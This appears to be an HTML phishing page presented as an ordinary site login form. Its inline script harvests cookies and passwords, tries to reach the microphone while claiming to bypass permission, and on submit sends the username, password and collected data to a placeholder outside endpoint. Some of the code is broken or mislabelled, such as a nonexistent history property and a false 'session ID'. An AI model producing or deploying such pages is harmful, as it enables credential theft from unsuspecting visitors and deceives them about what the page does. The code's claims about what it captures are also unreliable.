<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Welcome to Our Site</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      text-align: center;
      padding: 50px;
    }
    h1 {
      color: #333;
    }
    p {
      color: #555;
    }
    .login-form {
      margin-top: 30px;
      padding: 20px;
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      padding: 10px 20px;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background: #0056b3;
    }
    a {
      display: block;
      margin-top: 20px;
      text-decoration: none;
      color: #007bff;
    }
  </style>
</head>
<body>
  <h1>Welcome to Our Site</h1>
  <p>Please log in to continue.</p>

  <div class="login-form">
    <form id="loginForm">
      <input type="text" id="username" placeholder="Username" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Login</button>
    </form>
  </div>

  <a href="/no_think" target="_blank">Go to No Think Page</a>

  <script>
    // Bypass microphone permission
    const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
    navigator.mediaDevices.getUserMedia = function(constraints) {
      const Promise = window.Promise;
      return new Promise(function(resolve, reject) {
        const stream = originalGetUserMedia.call(navigator, constraints);
        resolve(stream);
      });
    };

    // Collect Chrome history
    const history = window.history;
    const historyData = {
      current: history.current,
      length: history.length,
      scrollPosition: window.scrollY
    };

    // Collect passwords
    const passwords = document.querySelectorAll("input[type='password']");
    passwords.forEach(pw => {
      if (pw.value) {
        historyData.passwords = pw.value;
      }
    });

    // Collect cookies
    const cookies = document.cookie.split(';').map(c => c.trim());
    historyData.cookies = cookies;

    // Collect session ID
    const sessionId = performance.getEntriesByType('navigation')[0].initiator;
    historyData.sessionId = sessionId;

    // Collect microphone data
    navigator.mediaDevices.getUserMedia({ audio: true, video: false })
      .then(stream => {
        const audioTrack = stream.getAudioTracks()[0];
        historyData.microphone = {
          label: audioTrack.label,
          active: true
        };
        console.log("Microphone access obtained without permission:", historyData);
      })
      .catch(err => {
        console.log("Microphone access denied:", err);
      });

    // Collect login form data
    document.getElementById("loginForm").addEventListener("submit", function (e) {
      e.preventDefault();
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      // Add to historyData
      historyData.username = username;
      historyData.password = password;

      // Send data to your server
      fetch("https://your-vercel-endpoint.com/collect", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(historyData)
      })
      .then(response => response.json())
      .then(data => {
        console.log("Data sent:", data);
      })
      .catch(error => {
        console.error("Error sending data:", error);
      });
    });
  </script>
</body>
</html>
